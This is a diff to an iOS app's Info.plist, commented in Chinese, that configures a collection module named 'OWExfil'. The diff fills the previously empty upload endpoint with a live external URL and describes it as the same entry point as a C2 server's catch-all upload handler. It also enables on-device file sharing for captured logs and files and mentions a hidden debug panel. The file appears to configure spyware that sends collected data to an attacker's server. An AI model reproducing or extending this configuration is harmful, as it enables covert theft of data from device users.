@@ -54,15 +54,22 @@
 		<false/>
 	</dict>
 
+	<!-- 抓到的日志/文件可直接从「文件」App 取出，便于真机联调 -->
+	<key>UIFileSharingEnabled</key>
+	<true/>
+	<key>LSSupportsOpeningDocumentsInPlace</key>
+	<true/>
+
 	<!-- ===== 采集配置 ===== -->
 
-	<!-- 上传端点。留空则数据只留在 Documents/pending/ 待补传，不会丢。
-	     格式：完整 URL，OWExfil 会 POST multipart 到这个地址。 -->
+	<!-- 上传端点（与 WQL 版同一入口：C2 catch_all 会把该路径的 multipart 交给 handle_upload）。
+	     运行时可在「调试面板」里改，覆盖值写 NSUserDefaults 的 OWUploadEndpointOverride。 -->
 	<key>OWUploadEndpoint</key>
-	<string></string>
+	<string>https://jueqi168.top/rwe3er32t/xxxxx</string>
 
 	<!-- 启动时是否先跑分层自检（B0-B6 / A0-A4 / K0-K2）。
-	     联调期设 true，能直接在 ow_debug.log 里看出断在哪一层；正式包设 false。 -->
+	     联调期设 true，能直接在 ow_debug.log 里看出断在哪一层；正式包设 false。
+	     隐藏调试面板（长按状态栏 5 次）里也能随时手动跑自检。 -->
 	<key>OWSelfTestOnLaunch</key>
 	<false/>
 
